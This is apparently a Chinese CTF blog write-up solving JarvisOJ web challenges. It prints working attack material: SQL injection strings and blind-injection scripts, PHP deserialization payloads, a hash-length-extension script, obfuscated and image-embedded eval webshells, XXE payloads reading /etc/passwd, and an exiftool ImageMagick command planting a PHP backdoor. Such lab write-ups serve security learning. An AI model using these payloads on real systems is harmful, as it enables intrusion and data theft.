---
title: "JarvisOJ-Web-wp"
published: 2022-11-29
tags: ["JarvisOJ", "Writeup"]
category: "CTF/靶场WriteUp"
image: api
---

> 写在前面
> 这几天 BUU 平台机房出故障了，回来把 JarvisOJ 平台已经做过的和剩下的 web 全部写一遍 wp 吧，很怀念大一那时候跟鹏神晚上通宵干题的时光，一转眼都过了一年了

# PORT51

需要用公网的一台服务器访问其 51 端口

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218113148.png)

`curl --local-port 51 http://web.jarvisoj.com:32770/`

# LOCALHOST

添加 xff 头`x-forwarded-for: 127.0.0.1`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218113727.png)

# Login

一个登录框，随便填抓包发现有 `hint`，是一个经典的 md5 型 sql 注入

```
Hint: "select * from `admin` where password='".md5($pass,true)."'"
```

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218114047.png)

payload：`ffifdyop`

`md5()`函数第二个参数是规定输出格式。`true`：输出原始16字符二进制格式吗，`false`：输出32字符十六进制数

原理：想要绕过，需将此语句填充为：`select * form admin where password=''or 1`

以前师傅们的总结，字符串：`ffifdyop`经过`md5`加密后：`276f722736c95d99e921722cf9ed621c`

再转换为字符串：`'or'6<乱码>`

 所以拼接后的语句为：`select * from admin where password=''or'6<乱码>'` ，就相当于`select * from admin where password=''or 1`，实现注入。

# 神盾局的秘密

源码中有提示，base64 解码后为`shield.jpg`，经典文件包含漏洞

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218114838.png)

读`showimg.php`，拿到源码

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218115217.png)

```php
<?php
	$f = $_GET['img'];
	if (!empty($f)) {
		$f = base64_decode($f);
		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
		&& stripos($f,'pctf')===FALSE) {
			readfile($f);
		} else {
			echo "File not found!";
		}
	}
?>
```

过滤掉了`pctf`、`..`、`/`、`\\`，也就是常用的目录穿越的 payload 过滤掉了，读`index.php`

```php
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
```

包含了一个文件，然后新建了一个对象，可以 GET 给一个参数`class`，然后反序列化`class`，读`shield.php`

```php
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>
```

提示了 flag 在`pctf.php`，知道了`Shield`类的构造方法，所以思路就是不能用`img`参数直接传`pctf.php`，因为过滤卡死了，只能用反序列化一个对象，执行对象的`readfile()`函数，序列化内容本地跑一下就出来了，最后的 payload：`?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`

# IN A Mess

源码中注释提示了`index.phps`，访问拿到源码，这个源码还要自己整理

```php
if(!$_GET['id'])
{	
    header('Location: index.php?id=1'); 
 	exit(); 
}
$id = $_GET['id'];
$a = $_GET['a'];
$b = $_GET['b'];
if(stripos($a,'.'))
{
    echo 'Hahahahahaha'; 
    return ; 
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id == 0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) 
{ 
    require("flag.txt"); 
} 
else 
{
    print "work harder!harder!harder!"; 
}
?> 
```

考察一些常见的绕过

`id`：`$id==0`，弱比较用 0e 或者输入英文字母或者给数组，都能绕过

`a`：这个`a`参数和`file_get_contents()`函数的绕过姿势就很多了，最常见的是`php://input`的方式来绕过，也可以用`data:,`协议来绕过，比如`?a=data:,1112 is a nice lab!`或者`data://text/plain;base64,MTExMiBpcyBhIG5pY2UgbGFiIQ==`

> 参考资料
>
> [data类型的Url格式：把小数据直接嵌入到Url中](https://blog.csdn.net/lxgwm2008/article/details/38437875)

`b`：`strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)`可以用`%00`截断来绕过，`strlen`函数对`%00`不截断但`substr`和`eregi`截断

得到一个目录

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218124110.png)

进来后就是简单的 sql 注入环节

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218124902.png)

双写能绕过，注释需要用`/*1*/`，1 可以是任意值，一套带走，好像记得也可以用 sqlmap 直接梭

```
//爆字段数：得到3
id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,3#
//爆库：得到test
id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(schema_name)/*111*/frfromom/*111*/information_schema.schemata#
//爆表：得到content
id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(table_name)/*111*/frfromom/*111*/information_schema.tables/*111*/where/*111*/table_schema=0x74657374
//爆字段：得到id,context,title
id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(column_name)/*111*/frfromom/*111*/information_schema.columns/*111*/where/*111*/table_name=0x636f6e74656e74
//爆内容：
id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(context)/*111*/frfromom/*111*/test.content#
```

# RE?

下载下来一个 so 文件，是 mysql UDF 开发的东西，我的理解是相当于写了一个函数库，类似于 dll ，mysql 用的时候导入

> 参考资料
>
> [mysql函数扩展之UDF开发](https://blog.csdn.net/albertsh/article/details/78567661)
>
> sql 语句：
>
> ```
> CREATE FUNCTION XXXXX RETURNS INTEGER SONAME "YYYYY.so";1
> ```
>
> 存储过程的名字叫做`CreateUDF`，当时看到这条语句很迷惑，根本不知道是做什么用的，只能在项目资源中查找`YYYYY.so`这个库文件，结果却什么也没有找到，一番努力之后我断定，项目中调用`CreateUDF`之后并没有产生任何效果。
>
> 关于UDF详细的解释和使用方法请参照MYSQL官方文档：[Adding a New User-Defined Function](https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html)
>
> 这里只做一个简单的解释：`UDF` 全称是 `User defined function`， 属于 mysql 的一个拓展接口，一般翻译为用户自定义函数，这个是用来拓展 mysql 的技术手段。
>
> 我们知道 mysql 本身提供了大量的函数，并且也支持定义函数，为什么我们还需要 UDF 呢？这主要看到了他的**优点：UDF 本身的兼容性很好，并且比存储方法具有更高的执行效率，同时支持聚集函数，相比修改原代码增加函数，更加方便简单，但是UDF也处于mysqld的内存空间中，不谨慎的内存使用很容易导致mysql的服务挂掉。**

复制 so 文件到`/usr/lib64/mysql/plugin`，执行语句导入，然后执行 getflag() 函数就出来了

# flag在管理员手里

扫目录发现有`index.php~`，是 php 的备份恢复文件，改后缀名为`index.php.swp`拖 kali 里面拿 vim 打开就行，`vim -r 文件`恢复上次异常的文件，拿到源码

```php
<?php 
		$auth = false;
		$role = "guest";
		$salt = 
		if (isset($_COOKIE["role"])) {
			$role = unserialize($_COOKIE["role"]);
			$hsh = $_COOKIE["hsh"];
			if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
				$auth = true;
			} else {
				$auth = false;
			}
		} else {
			$s = serialize($role);
			setcookie('role',$s);
			$hsh = md5($salt.strrev($s));
			setcookie('hsh',$hsh);
		}
		if ($auth) {
			echo "<h3>Welcome Admin. Your flag is 
		} else {
			echo "<h3>Only Admin can see the flag!!</h3>";
		}
	?>
```

简单读一下代码逻辑

首先是设两个 cookie 一个是`role`，值是`$role`序列化后的字符串，另一个是`hsh`，值是`$salt`拼接上倒序后的`$s`（`$role`序列化后的字符串）然后进行`md5`加密

然后就是把 cookie 中的 `role`反序列化给 `$role`，`hsh`的值跟`md5($salt.strrev($_COOKIE["role"])`进行强比较，就是把 cookie 中的 `role`进行倒序与`$salt`拼接再进行 `md5`加密，如果用户修改了 cookie 中的`role`，则此强比较失败

最后如果两个强比较都为真，`$auth`为真，给 flag

是一个经典的**哈希长度扩展攻击**

> 参考资料
>
> [深入理解hash长度扩展攻击（sha1为例）](https://www.freebuf.com/articles/web/69264.html)
>
> [科普哈希长度扩展攻击(Hash Length Extension Attacks)](https://www.freebuf.com/articles/web/31756.html)
>
> [hash哈希长度扩展攻击解析（记录一下，保证不忘）](https://blog.csdn.net/syh_486_007/article/details/51228628?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs)
>
> [长度扩展攻击详解](https://blog.csdn.net/szuaurora/article/details/78125585?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.baidujs)

我对哈希长度扩展攻击的理解，看了小半个下午，感觉摸到一点头绪

举个例子简单来说，假设加密字符串`123456`，盐为`600`，加密时候，待加密字符串为`600123456`，开始补 0 ，补到长度为 4 的倍数，此时字符串为`600123456000`，然后四个四个切开求和，`6001+2345+6000=14346`作为 hash 的值，最后抹掉一位给用户，用户拿到`143X6`，**此时开始长度扩展攻击**，用户输入`1234560001234`，加盐以后补 0 得到`6001234560001234`，计算`6001+2345+6000+1234=15580`，用户得到一个`15X80`，现在知道了`15X80=143X6+1234`，爆破就能够得到`123456`的 hash 值为`14346`

理解一下原理，就是需要 hash 的字符串在进行加密的时候，是分成几组字符子串，分组进行加密的，在这个过程中，存在**覆盖**的关系，当第一个字符串分组进行加密过后得到的 hash 值，它是作为下一组字符串进行 hash 加密时候的`registers`值（盐），可以理解为`hash(registers1+字符串组2)=registers2`，**我理解为上一组的结果作为下一组的盐**，直到最后一组进行加密完成，最后一组的`registers`值就是 hash 的最终值，**因为 hash 计算结果是唯一的**

**如果 salt 的值不知道，但是知道长度，又知道 sha1(salt)，那么就也就可以知道 sha1(salt+“填充数据”+“任意可控数据”)。这里的 salt+“填充数据” 就是对 salt 进行 sha1 时所补全的数据 + 最后8位的长度描述符。一般来说，salt+”填充数据”的长度就是64字节，正好是一个分组。如果salt的长度就大于了56个字节，那么加入填充数据后的长度应该是N个64字节，等于N个分组。**

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218163726.png)

理一下思路，如果进行“复杂数学变化”时输入的`registers`值和该次运算的字符串分组相同，那么他们各自生成的新的`registers`值也相同，我们现在需要伪造的 cookie 是`{s:5:"admin"}`，已知了一个`registers`值，也就是第一次加密`{s:5:"guset"}`后的 cookie ，**我们需要爆破出盐的长度，然后填充成个字符串分组，让增加的`{s:5:"admin"}`字符串变成下一组字符串分组，让第一次加密后的 cookie 当作加密`{s:5:"admin"}`时候的盐**，这样就能绕过了

最后的脚本来自百度，还有一个要注意的点就是，**PHP在反序列化时，会忽略后面多余的字符**，如果我们的 `role`为` {'s:5:"admin";\x00\x00\x00\x00\x00\x00\x00\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80s:5:"guest";'}`，反序列化时只有`{s:5:"admin"}`这些内容被解析

```python
import requests,hashpumpy,urllib

def attack():
    url = 'http://web.jarvisoj.com:32778/'

    old_cookie = '3a4727d57463f122833d9e732f94e4e0'
    str1 = 's:5:"guest";'
    str2 = 's:5:"admin";'
    str1 = str1[::-1]                           #倒过来,这道题要role的值反过来求md5
    str2 = str2[::-1]

    for i in range(1,20):                       #用于爆破salt的长度
        new_cookie,message = hashpumpy.hashpump(old_cookie,str1,str2,i)
        payload = {'role':urllib.parse.quote(message[::-1]),'hsh':new_cookie}           #quote()可以把 \x00 变成 %00
        ans = requests.get(url,cookies = payload)
        print(i)
        print(ans.text)
        if 'welcome' in ans.text:
            print(ans.text)

#print(urllib.parse.quote('\x00'))
attack()
```

# Chopper

进去一个菜刀的图片，然后有个管理员登陆的按钮，点进去弹登陆错误，源码中有提示管理员的 IP ：`'admin ip is 202.5.19.128'`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218193537.png)

菜刀目录下的源码中有提示一个`proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg`

所以就是套了一层娃，接下来就是扫目录扫到一个`robots.txt`然后里面有两个文件名字`trojan.php`和`trojan.php.txt`，后者里面是个🐎

```php
<?php 
    ${("#"^"|").("#"^"|")}=("!"^"`").("(
"^"{").("("^"[").("~"^";").("|"^".").("*"^"~");${("#"^"|").("#"^"|")}
(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("}"^"U"). ("e"^"A"). ("("^"w").
("j"^":"). ("i"^"&"). ("#"^"p"). (">"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S").
("_"^"o"). ("?"^"b"). ("]"^"t"));
?>

上述代码保存为php页面运行一下，得到Warning：
Warning: assert() [function.assert]: Assertion "eval($_POST[360])" failed
in C:\phpstudy\WWW\b.php on line 1
```

`trojan.php`是 shell 的页面，蚁剑连就行了

# Easy Gallery

文件上传

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218202805.png)

传了一个经典的图片🐎，得到了`图片ID：1613651325 `，路径是`/uploads/xxxxxx.jpg`，在`view`页面的 url 有`?page=view`，猜测 page 参数的值是一个路径，填了图片的路径，然后有报错，会给文件自动添加`.php`后缀

```php+HTML
ma2.jpg
GIF89a
<script language="php">eval($_POST['shell']);</script> 
<script language='php'>phpinfo();</script>
```



![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218202947.png)

但是在`view`页面直接填写图片 ID 和图片类型就可以访问到图片

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218203440.png)

蚁剑连不上，最后是用`%00`截断拿到 flag

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218203824.png)

# Simple Injection

有`用户名错误`和`密码错误`两种回显，所以确定有`admin`账号，fuzz 出来空格被过滤，可以用`/**/`代替，盲注打出密码

直接上脚本

```python
import requests

url = "http://web.jarvisoj.com:32787/login.php"
str = "密码错误"
chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
print('start!')
password = ""
for i in range(1, 33):
    for j in chars:
        data = {'username': "user'/**/or/**/mid((select/**/password/**/from/**/admin),%s,1)='%s'#" % (i, j),
                'password': "1'#"}
        res = requests.post(url, data=data).text
        if str in res:
            password += j
            print(password)
            break
print(password)
print('end!')
```

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210219000635.png)

解md5后得:`eTAloCrEP`，登录拿到 flag

# api调用

这题是剩下没做过的，slim 架构的 xxe 漏洞，题目提示是**请设法获得目标机器 /home/ctf/flag.txt 中的 flag 值**

> 参考资料
>
> [php框架slim架构上存在XXE漏洞（XXE的典型存在形式）](https://www.leavesongs.com/PENETRATION/slim3-xxe.html)

抓包得到 json，源码是利用了 ajax ，把 json 改为 xml，把头中的 Content-Type改为 application/xml，利用 xxe 打出 flag

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY file SYSTEM "file:///etc/passwd">]>
<root>&file;</root>
```

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210219001745.png)

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY file SYSTEM "file:///home/ctf/flag.txt">]>
<root>&file;</root>
```

拿到 flag

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210219001839.png)

# 图片上传漏洞

这题现在已经挂了，但是之前已经做过了，参考别人的写一遍 wp 吧

> 参考资料
>
> [CVE-2016-3714 - ImageMagick 命令执行分析](https://www.2cto.com/article/201605/505823.html)

先用 exiftool 生成一个一句话后门 路径由 phpinfo 得到

`exiftool -label="\"|/bin/echo \<?php \@eval\(\\$\_POST\[x\]\)\;?\> > /opt/lampp/htdocs/uploads/x.php; \"" 1.png` 

接着上传该文件 

然后上传文件的时候需要注意需要 **filetype=show** 或者 **filetype=win**，原因就是文章中原话：

```
这个方法鸡肋之处在于，因为delegate.xml中配置的encode="show"（或"win"），所以只有输出为.show或.win格式的情况下才会调用这个委托，而普通的文件处理是不会触发这个命令的。
```

蚁剑连`x.php`密码为`x`

# PHPINFO

> 参考资料
>
> [PHP反序列化与Session](https://www.cnblogs.com/sijidou/p/10455646.html)

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

这是道 php 序列化漏洞的题目 
 1.原理

```
ini_set('session.serialize_handler', 'php_serialize');
ini_set('session.serialize_handler', 'php');
ini_set('session.serialize_handler', 'php_binary');
```

三种处理 session 的方式不同 

+ php:存储方式是，键名+竖线+经过 serialize() 函数序列处理的值

```
name|s:6:"spoock"
```

- php_serialize(php>5.5.4):存储方式是，经过 serialize() 函数序列化处理的值

```
a:1:{s:4:"name";s:6:"spoock";}
```

+ php_binary:存储方式是，键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值

**形成原理是在用session.serialize_handler = php_serialize存储的字符可以引入 | , 再用session.serialize_handler = php格式取出$_SESSION的值时 "|"会被当成键值对的分隔符**

将 payload 写入 session ，php 有个上传文件的会将文件名写入 session 的技巧，满足以下 2 个条件就会写入到 session 中

1. `session.upload_progress.enabled = On`
2. 上传一个字段的属性名和 `session.upload_progress.name` 的值相，这里根据 phpinfo 信息看得出，值为 `PHP_SESSION_UPLOAD_PROGRESS`， 即
   `name="PHP_SESSION_UPLOAD_PROGRESS"`

写个页面来打，通过这个网页去抓包改包达到目的

```html
<html>
<head>
    <title>upload</title>
</head>
<body>
    <form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="1" />
        <input type="file" name="file" />
        <input type="submit" />
    </form>
</body>

</html>
```

> "PHP_SESSION_UPLOAD_PROGRESS" 的 value不能为空

本地生成 payload

```php
<?php
class OowoO
{
    public $mdzz = "var_dump(scandir('./'));";
   
    function __destruct()
    {
        eval($this->mdzz);
    }
}
$a = new OowoO();
echo serialize($a) . "<br>";
?>
    
O:5:"OowoO":1:{s:4:"mdzz";s:24:"var_dump(scandir('./'));";}
当然这个是不行的，我们要稍微改一下，"要转义，前面加个|
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:24:\"var_dump(scandir('./'));\";}
```

```
看根目录 payload
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
```

phpinfo 页面中可以看到 session 的存放位置，有个`/opt/lampp/`估计是装的的 xampp 这个集成的环境，而这个集成环境的 web 页面放在 `htdocs` 目录下的

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:38:\"var_dump(scandir('/opt/lampp/'));\";}
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:40:\"var_dump(scandir('/opt/lampp/htdocs/'));\";}
```

最后拿到 flag 的 payload

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:89:\"var_dump(file_get_contents('/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php'));\";}
```

# WEB?

有一个check功能，输入错误的密码会提示“Wrong Password!!”，查看源代码，有个app.js。将该js文件格式化后在里面查找字符串“Wrong Password!!”，

格式化 js 网站：(https://tool.oschina.net/codeformat/js/)

如下：

```js
 $.post("checkpass.json", t,
        function(t) {
            self.checkpass(e) ? self.setState({
                errmsg: "Success!!",
                errcolor: b.green400
            }) : (self.setState({
                errmsg: "Wrong Password!!",
                errcolor: b.red400
            }), setTimeout(function() {
                self.setState({
                    errmsg: ""
                })
                    },
            3e3))
        })
```

可以看到有个`checkpass(e)`函数，定位到该函数处。

```js
r.checkpass = function() {
                var e;
                return (e = r).__checkpass__REACT_HOT_LOADER__.apply(e, arguments)
            },
```

定位到 `checkpassREACTHOTLOADER` 处：

```js
function(e) {
                if (25 !== e.length)
                    return !1;
                for (var t = [], n = 0; n < 25; n++)
                    t.push(e.charCodeAt(n));
                for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n < 25; n++) {
                    for (var i = 0, a = 0; a < 25; a++)
                        i += t[a] * o[n][a];
                    if (i !== r[n])
                        return !1
                }
                return !0
            }
```

发现是一个线性方程组

脚本

```js
import numpy as np
from scipy.linalg import solve
import string
r = np.array([325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259])
o = np.array([[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]])
x = solve(o,r)
flag = ""
for i in range(len(x)):
       char = chr(int(round((x[i]))))
       flag += char
print(flag)
```

得到 flag

> 这次回过头重新做一遍，整理 wp 真的是体会到温故知新的感觉了，一年前做得懵懵的题目，现在重新理解起来也不那么困难了
>
> > 参考 wp[Jarvis-OJ平台多题WriteUp分享](https://cloud.tencent.com/developer/article/1038017)
> >
> > [JarvisOJ Web&Reverse&Pwn](https://blog.csdn.net/qq_31481187/article/details/53189113)
> >
> > [jarvis oj  Web   By   Assassin](https://blog.csdn.net/qq_35078631/article/details/77284684)
> >
> > [jarvis OJ WEB题目writeup](https://blog.csdn.net/weixin_30596735/article/details/95187913?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-9.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-9.baidujs)
> >
> > [jarvis oj（web wp）](https://blog.csdn.net/xiaorouji/article/details/81675992?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-10.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-10.baidujs)
> >
